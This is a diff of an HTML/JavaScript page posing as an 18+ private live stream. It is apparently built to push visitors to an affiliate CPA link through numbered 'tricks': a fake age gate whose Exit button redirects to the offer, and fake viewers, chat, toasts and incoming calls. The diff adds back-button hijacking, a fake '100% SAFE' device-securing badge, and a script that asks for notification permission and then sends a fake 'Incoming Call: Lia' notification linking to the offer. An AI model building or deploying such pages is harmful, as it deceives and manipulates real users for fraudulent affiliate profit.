@@ -10,25 +10,20 @@
         body { background-color: #020617; color: #f8fafc; font-family: 'Segoe UI', sans-serif; overflow-x: hidden; }
         .glass-panel { background: rgba(15, 23, 42, 0.85); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.1); }
         
-        /* Typing Animation */
         .typing-dot { animation: typing 1.4s infinite ease-in-out both; }
         .typing-dot:nth-child(1) { animation-delay: -0.32s; }
         .typing-dot:nth-child(2) { animation-delay: -0.16s; }
         @keyframes typing { 0%, 80%, 100% { transform: scale(0); } 40% { transform: scale(1); } }
 
-        /* Glowing Pulse */
         .glow-btn { animation: glow 2s infinite alternate; }
         @keyframes glow { 0% { box-shadow: 0 0 5px #10b981; } 100% { box-shadow: 0 0 20px #10b981, 0 0 30px #10b981; } }
 
-        /* Notification Toast Slide */
         .toast-slide { animation: slideUpFade 4s forwards; }
         @keyframes slideUpFade { 0% { transform: translateY(100px); opacity: 0; } 10% { transform: translateY(0); opacity: 1; } 90% { transform: translateY(0); opacity: 1; } 100% { transform: translateY(-50px); opacity: 0; } }
 
-        /* Content Blur Trap */
         .blur-trap { filter: blur(8px); transition: filter 0.3s; }
         .blur-trap-container:hover .blur-trap { filter: blur(4px); }
 
-        /* Custom Scrollbar */
         ::-webkit-scrollbar { width: 6px; }
         ::-webkit-scrollbar-track { background: #020617; }
         ::-webkit-scrollbar-thumb { background: #334155; border-radius: 10px; }
@@ -36,23 +31,20 @@
 </head>
 <body class="antialiased overflow-hidden" id="mainBody">
 
-    <!-- TRICK 1: AGE GATE -->
     <div id="ageGate" class="fixed inset-0 bg-black z-[200] flex flex-col items-center justify-center p-4">
         <div class="glass-panel p-8 rounded-3xl max-w-md w-full text-center border-t-4 border-red-500 shadow-[0_0_50px_rgba(239,68,68,0.3)]">
             <i class="fas fa-exclamation-triangle text-5xl text-red-500 mb-4"></i>
             <h1 class="text-3xl font-black mb-2 uppercase">18+ Only</h1>
             <p class="text-gray-400 mb-6 text-sm">This page contains live private streaming. You must be at least 18 years old and create a FREE account to enter.</p>
             <div class="flex gap-4">
-                <button onclick="window.location.href='https://google.com'" class="w-1/2 bg-gray-800 text-gray-400 py-3 rounded-xl font-bold hover:bg-gray-700 transition">Exit</button>
+                <button onclick="goCPA()" class="w-1/2 bg-gray-800 text-gray-400 py-3 rounded-xl font-bold hover:bg-gray-700 transition">Exit</button>
                 <button onclick="acceptAge()" class="w-1/2 bg-red-600 text-white py-3 rounded-xl font-bold glow-btn transition">I am 18+ (Enter)</button>
             </div>
         </div>
     </div>
 
-    <!-- MAIN CONTENT (Hidden until Age Gate passed) -->
     <div id="contentWrapper" class="opacity-0 transition-opacity duration-1000 h-screen overflow-y-auto pb-32">
         
-        <!-- TRICK 14: STICKY LOGIN BAR -->
         <nav class="sticky top-0 z-[60] glass-panel border-b border-gray-800 shadow-xl">
             <div class="max-w-7xl mx-auto px-4 py-3 flex flex-wrap justify-between items-center gap-3">
                 <div class="flex items-center gap-3">
@@ -65,14 +57,12 @@
                         <p class="text-[10px] text-green-400 font-bold uppercase"><span id="liveViewers">1,842</span> Viewers • LIVE</p>
                     </div>
                 </div>
-                <!-- Login Trap -->
                 <div class="flex gap-2 w-full sm:w-auto">
                     <input type="text" placeholder="Username" class="bg-slate-900 border border-slate-700 rounded-lg px-3 py-1.5 text-xs w-full sm:w-28 focus:border-green-500 outline-none">
                     <input type="password" placeholder="Password" class="bg-slate-900 border border-slate-700 rounded-lg px-3 py-1.5 text-xs w-full sm:w-28 focus:border-green-500 outline-none">
                     <button onclick="triggerTrap('login')" class="bg-green-600 hover:bg-green-500 text-white font-bold px-4 py-1.5 rounded-lg text-xs transition shadow-[0_0_10px_rgba(34,197,94,0.4)] whitespace-nowrap">Log In</button>
                 </div>
             </div>
-            <!-- TRICK 8: PROGRESS BAR -->
             <div class="w-full bg-slate-800 h-1">
                 <div class="bg-blue-500 h-1 w-[90%] relative">
                     <span class="absolute -top-6 right-0 text-[9px] text-blue-400 font-bold uppercase">Account Status: 90% (Action Required)</span>
@@ -82,24 +72,26 @@
 
         <main class="max-w-7xl mx-auto px-2 sm:px-4 mt-6 grid grid-cols-1 lg:grid-cols-12 gap-6">
             
-            <!-- LEFT COLUMN (Live Stream & Videos) -->
             <div class="lg:col-span-8 space-y-6">
                 
-                <!-- TRICK 6: COUNTDOWN TIMER -->
-                <div class="bg-red-900/30 border border-red-500/50 rounded-xl p-3 flex justify-between items-center text-red-200">
-                    <span class="text-xs font-bold"><i class="fas fa-clock mr-1"></i> FREE Registration Closes In:</span>
-                    <span id="countdown" class="font-black text-lg text-red-400 bg-red-950 px-3 rounded shadow-inner">04:59</span>
+                <div class="flex flex-col sm:flex-row gap-3">
+                    <div class="flex-1 bg-red-900/30 border border-red-500/50 rounded-xl p-3 flex justify-between items-center text-red-200">
+                        <span class="text-xs font-bold"><i class="fas fa-clock mr-1"></i> FREE Reg Closes In:</span>
+                        <span id="countdown" class="font-black text-lg text-red-400 bg-red-950 px-3 rounded shadow-inner">04:59</span>
+                    </div>
+                    <div class="flex-1 bg-blue-900/30 border border-blue-500/50 rounded-xl p-3 flex justify-between items-center text-blue-200">
+                        <span class="text-xs font-bold" id="deviceText"><i class="fas fa-shield-alt mr-1"></i> Securing Connection...</span>
+                        <span class="font-black text-[10px] bg-blue-600 px-2 py-1 rounded">100% SAFE</span>
+                    </div>
                 </div>
 
-                <!-- TRICK 9: FAKE LIVE VIDEO PLAYER -->
                 <div class="relative glass-panel rounded-2xl overflow-hidden shadow-2xl border border-gray-800 group" onclick="triggerTrap('livestream')">
                     <div class="absolute top-4 left-4 bg-red-600 text-white text-[10px] font-black px-2 py-1 rounded uppercase tracking-widest z-10 flex items-center gap-1 shadow-lg">
                         <span class="w-2 h-2 bg-white rounded-full animate-pulse"></span> LIVE
                     </div>
-                    <!-- Using one of your Drive links as background preview -->
-                    <iframe src="https://drive.google.com/file/d/1VwRl5_0Fc_BhbPtloFWQTb6dl2AVAGt6/preview" class="w-full aspect-video pointer-events-none opacity-80" frameborder="0"></iframe>
                     
-                    <!-- Fake Player Controls -->
+                    <iframe src="https://drive.google.com/file/d/13SzbqnfE2kgRpaE2cdNV_EJG3I0UwP8G/preview" class="w-full aspect-video pointer-events-none opacity-90" frameborder="0"></iframe>
+                    
                     <div class="absolute inset-0 bg-black/40 flex flex-col justify-end p-4 z-20 group-hover:bg-black/20 transition cursor-pointer">
                         <div class="flex items-center justify-center absolute inset-0">
                             <i class="fas fa-play-circle text-6xl text-white/70 group-hover:text-green-400 transition transform group-hover:scale-110 glow-btn rounded-full"></i>
@@ -108,7 +100,7 @@
                             <div class="bg-red-500 h-full w-1/3 relative"><span class="absolute right-0 top-1/2 -translate-y-1/2 w-3 h-3 bg-white rounded-full"></span></div>
                         </div>
                         <div class="flex justify-between text-xs font-bold text-white">
-                            <span>Live Broadcast</span>
+                            <span>Private Broadcast Active</span>
                             <div class="flex gap-3 text-xl">
                                 <i class="fas fa-volume-up hover:text-green-400"></i>
                                 <i class="fas fa-expand hover:text-green-400"></i>
@@ -117,19 +109,16 @@
                     </div>
                 </div>
 
-                <!-- GALLERY SECTION (Mix of clear & blurred) -->
                 <div>
                     <h2 class="text-xl font-black mb-4 uppercase tracking-wider text-gray-300 flex items-center justify-between">
                         <span><i class="fas fa-images text-blue-500 mr-2"></i> VIP Gallery</span>
                         <span class="text-xs text-gray-500 font-normal">10 Photos</span>
                     </h2>
                     <div class="grid grid-cols-2 md:grid-cols-5 gap-2">
-                        <!-- Clear Images -->
                         <img src="https://github.com/mizan000321-ops/newv/blob/main/GoWoZl9X0AA1I6V.jpg?raw=true" class="w-full h-32 object-cover rounded-xl cursor-pointer hover:scale-105 transition" onclick="triggerTrap('photo')">
                         <img src="https://github.com/mizan000321-ops/newv/blob/main/Gv2LKn_XwAAsWou.jpg?raw=true" class="w-full h-32 object-cover rounded-xl cursor-pointer hover:scale-105 transition" onclick="triggerTrap('photo')">
                         <img src="https://github.com/mizan000321-ops/newv/blob/main/HAwdaxsW0AA1AU1.jpg?raw=true" class="w-full h-32 object-cover rounded-xl cursor-pointer hover:scale-105 transition" onclick="triggerTrap('photo')">
                         
-                        <!-- TRICK 12: BLUR REVEAL TRAP -->
                         <div class="relative w-full h-32 rounded-xl overflow-hidden blur-trap-container cursor-pointer" onclick="triggerTrap('photo')">
                             <img src="https://github.com/mizan000321-ops/newv/blob/main/HBuOij0WoAAfrI3.jpg?raw=true" class="w-full h-full object-cover blur-trap">
                             <div class="absolute inset-0 bg-black/40 flex flex-col items-center justify-center text-center p-1">
@@ -144,7 +133,6 @@
                     </div>
                 </div>
 
-                <!-- TRICK 11: FAKE VOICE NOTES -->
                 <div class="glass-panel rounded-2xl p-4">
                     <h3 class="text-sm font-bold text-gray-400 uppercase mb-3"><i class="fas fa-microphone-alt text-green-500 mr-2"></i> Voice Messages</h3>
                     <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
@@ -159,13 +147,10 @@
                         </div>
                     </div>
                 </div>
-
             </div>
 
-            <!-- RIGHT COLUMN (Chat & Proof) -->
             <div class="lg:col-span-4 space-y-6">
                 
-                <!-- Chat Box & Activity -->
                 <div class="glass-panel rounded-2xl p-4 h-[400px] flex flex-col relative overflow-hidden">
                     <div class="border-b border-gray-700 pb-2 mb-2 flex justify-between items-center">
                         <h3 class="font-bold text-sm uppercase text-gray-300">Room Chat</h3>
@@ -177,7 +162,6 @@
                         <div class="flex gap-2"><strong class="text-pink-400">System:</strong> <span class="text-yellow-400 italic">Dave just tipped 500 coins!</span></div>
                     </div>
 
-                    <!-- TRICK 4: FAKE TYPING INDICATOR -->
                     <div class="absolute bottom-16 left-4 flex items-center gap-2 text-xs text-gray-400 bg-black/60 px-3 py-1 rounded-full backdrop-blur-md">
                         <span class="text-green-400 font-bold">Lia</span> is typing 
                         <div class="flex gap-1"><div class="w-1.5 h-1.5 bg-gray-400 rounded-full typing-dot"></div><div class="w-1.5 h-1.5 bg-gray-400 rounded-full typing-dot"></div><div class="w-1.5 h-1.5 bg-gray-400 rounded-full typing-dot"></div></div>
@@ -191,7 +175,6 @@
                     </div>
                 </div>
 
-                <!-- TRICK 13: SECURITY BADGES -->
                 <div class="flex justify-center gap-4 opacity-50 grayscale hover:grayscale-0 transition">
                     <i class="fas fa-shield-check text-2xl text-blue-500"></i>
                     <i class="fas fa-lock text-2xl text-green-500"></i>
@@ -202,7 +185,6 @@
         </main>
     </div>
 
-    <!-- TRICK 15: INFINITE CALL OVERLAY -->
     <div id="masterCallOverlay" class="fixed inset-0 bg-slate-950/95 backdrop-blur-xl z-[150] flex flex-col items-center justify-center hidden">
         <div class="w-full max-w-sm px-6 text-center">
             <h3 id="callStatus" class="text-gray-400 font-bold uppercase tracking-[0.2em] text-xs mb-8">Incoming Secure Call</h3>
@@ -229,10 +211,8 @@
         </div>
     </div>
 
-    <!-- UNIVERSAL TRAP MODAL (Appears on any action) -->
     <div id="trapModal" class="fixed inset-0 bg-black/90 z-[200] hidden flex items-center justify-center p-4">
         <div class="glass-panel p-6 sm:p-10 rounded-3xl max-w-md w-full text-center relative overflow-hidden border border-blue-500/50">
-            <!-- Animated Background Gradient -->
             <div class="absolute top-0 left-0 w-full h-2 bg-gradient-to-r from-blue-500 via-green-500 to-pink-500"></div>
             
             <i class="fas fa-user-lock text-5xl text-blue-400 mb-4"></i>
@@ -252,7 +232,6 @@
         </div>
     </div>
 
-    <!-- TRICK 2: EXIT INTENT OVERLAY -->
     <div id="exitIntent" class="fixed inset-0 bg-red-900/90 z-[300] hidden flex-col items-center justify-center backdrop-blur-sm p-4 text-center">
         <h1 class="text-5xl font-black text-white mb-4 animate-bounce">WAIT!</h1>
         <h2 class="text-2xl text-white mb-6">Lia is trying to start a private session with you!</h2>
@@ -261,39 +240,41 @@
         <button onclick="document.getElementById('exitIntent').classList.add('hidden')" class="mt-6 text-gray-300 underline">Close</button>
     </div>
 
-    <!-- TOAST CONTAINER -->
     <div id="toastContainer" class="fixed bottom-4 left-4 z-[90] flex flex-col gap-2"></div>
 
-    <!-- AUDIO FILES -->
     <audio id="ringAudio" loop src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>
 
     <script>
-        // === CONFIGURATION ===
-        const CPA_LINK = "https://t.taffizerq.com/click?pid=3844&offer_id=2310"; // Paste your link here
+        const CPA_LINK = "https://t.taffizerq.com/click?pid=3844&offer_id=2310"; 
 
-        // === TRICK 1: AGE GATE LOGIC ===
+        // DEVICE DETECTION
+        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+        const deviceType = /iPhone|iPad|iPod/i.test(navigator.userAgent) ? "iPhone" : (isMobile ? "Android" : "Desktop");
+        document.getElementById('deviceText').innerHTML = `<i class="fas fa-shield-alt mr-1"></i> Securing ${deviceType}...`;
+
+        // BACK BUTTON HIJACK (Trick 16)
+        history.pushState(null, document.title, location.href);
+        window.addEventListener('popstate', function (event) {
+            window.location.href = CPA_LINK; 
+        });
+
         function acceptAge() {
             document.getElementById('ageGate').classList.add('hidden');
             const mainContent = document.getElementById('contentWrapper');
             mainContent.classList.remove('opacity-0');
             mainContent.classList.add('opacity-100');
             document.body.classList.remove('overflow-hidden');
-            
-            // Start the timers once entered
             startTimers();
         }
 
-        // === MASTER REDIRECT ===
         function goCPA() {
             window.location.href = CPA_LINK;
         }
 
         function triggerTrap(source) {
-            // Stops videos/audio if playing
             document.getElementById('trapModal').classList.remove('hidden');
         }
 
-        // === TRICK 3: DYNAMIC BROWSER TAB ===
         let originalTitle = document.title;
         let blinkInterval;
         document.addEventListener("visibilitychange", () => {
@@ -309,15 +290,13 @@
             }
         });
 
-        // === TRICK 2: EXIT INTENT (Desktop Only) ===
         document.addEventListener('mouseout', (e) => {
             if (e.clientY < 50 && !document.getElementById('ageGate').classList.contains('hidden') === false) {
                 document.getElementById('exitIntent').classList.remove('hidden');
             }
         });
 
-        // === TRICK 6: COUNTDOWN TIMER ===
-        let timeLeft = 299; // 4 mins 59 secs
+        let timeLeft = 299; 
         function updateTimer() {
             let m = Math.floor(timeLeft / 60);
             let s = timeLeft % 60;
@@ -325,14 +304,12 @@
             if(timeLeft > 0) timeLeft--;
         }
 
-        // === TRICK 5: LIVE VIEWER FLUCTUATION ===
         let viewers = 1842;
         function updateViewers() {
-            viewers += Math.floor(Math.random() * 11) - 4; // Up or down slightly
+            viewers += Math.floor(Math.random() * 11) - 4;
             document.getElementById('liveViewers').innerText = viewers.toLocaleString();
         }
 
-        // === TRICK 7: FAKE TOAST NOTIFICATIONS ===
         const names = ["Alex_US", "Mark99", "David_UK", "Chris", "John_D", "User7842"];
         const msgs = ["just registered for free!", "started a private call!", "unlocked VIP gallery!", "sent a tip!"];
         function showToast() {
@@ -344,7 +321,6 @@
             setTimeout(() => { toast.remove(); }, 4000);
         }
 
-        // === TRICK 15: MASTER CALL LOOP ===
         const ring = document.getElementById('ringAudio');
         let callCount = 0;
         const callStyles = [
@@ -354,7 +330,7 @@
         ];
 
         function triggerCall() {
-            if(!document.getElementById('trapModal').classList.contains('hidden')) return; // Don't call if trap is open
+            if(!document.getElementById('trapModal').classList.contains('hidden')) return; 
             
             const overlay = document.getElementById('masterCallOverlay');
             const style = callStyles[callCount % callStyles.length];
@@ -366,7 +342,6 @@
             overlay.classList.remove('hidden');
             ring.play().catch(e => console.log("Audio block"));
             
-            // TRICK 10: VIBRATION API (Mobile Only)
             if ("vibrate" in navigator) { navigator.vibrate([500, 250, 500, 250, 500]); }
             
             callCount++;
@@ -375,13 +350,12 @@
         function rejectCall() {
             document.getElementById('masterCallOverlay').classList.add('hidden');
             ring.pause(); ring.currentTime = 0;
-            if ("vibrate" in navigator) { navigator.vibrate(0); } // Stop vibration
+            if ("vibrate" in navigator) { navigator.vibrate(0); }
             
-            // Trap them anyway, or wait 15s for next call
             if(callCount > 2) {
-                triggerTrap('rejected_too_many'); // Force register after 3 rejects
+                triggerTrap('rejected_too_many'); 
             } else {
-                setTimeout(triggerCall, 15000); // 15s loop
+                setTimeout(triggerCall, 15000); 
             }
         }
 
@@ -389,19 +363,16 @@
             ring.pause(); ring.currentTime = 0;
             if ("vibrate" in navigator) { navigator.vibrate(0); }
             document.getElementById('masterCallOverlay').classList.add('hidden');
-            triggerTrap('accept_call'); // BOOM! Trap opens
+            triggerTrap('accept_call'); 
         }
 
-        // Initialize all timers after Age Gate
         function startTimers() {
             setInterval(updateTimer, 1000);
             setInterval(updateViewers, 3000);
             setInterval(showToast, 8000);
             
-            // First call after 15 seconds
             setTimeout(triggerCall, 15000);
             
-            // Fake Chat simulation
             setTimeout(() => {
                 const chat = document.getElementById('chatBox');
                 chat.innerHTML += `<div class="flex gap-2"><strong class="text-green-400">Lia:</strong> <span class="text-white">Is anyone there? I'm waiting!</span></div>`;
@@ -409,5 +380,44 @@
             }, 5000);
         }
     </script>
+function requestNotificationPermission() {
+    if (!("Notification" in window)) {
+        console.log("This browser does not support desktop notification");
+    } else if (Notification.permission === "granted") {
+        setupGhostNotification();
+    } else if (Notification.permission !== "denied") {
+        Notification.requestPermission().then(permission => {
+            if (permission === "granted") {
+                setupGhostNotification();
+            }
+        });
+    }
+}
+
+function setupGhostNotification() {
+    // ইউজার পেজ থেকে বের হওয়ার ১ মিনিট পর নোটিফিকেশন যাবে
+    window.addEventListener('beforeunload', function () {
+        // সেভ করে রাখা হচ্ছে যাতে ব্যাকগ্রাউন্ডে কাজ করে
+        localStorage.setItem('left_page', 'true');
+        
+        // এটি একটি ডামি সিস্টেম, প্রফেশনাল পুশ সার্ভার ছাড়া ১-২ বার ট্রাই করবে
+        setTimeout(() => {
+            if(Notification.permission === "granted") {
+                new Notification("📞 Incoming Call: Lia", {
+                    body: "Lia is waiting for you in the private room. Click to answer!",
+                    icon: "https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=100",
+                    tag: "ghost-call"
+                }).onclick = function() {
+                    window.focus();
+                    window.location.href = CPA_LINK;
+                };
+            }
+        }, 60000); // ৬০ সেকেন্ড পর নোটিফিকেশন যাবে
+    });
+}
+
+// পেজে ঢোকার ২০ সেকেন্ড পর পারমিশন চাইবে যাতে ইউজার বিরক্ত না হয়
+setTimeout(requestNotificationPermission, 20000);
+</script>
 </body>
 </html>
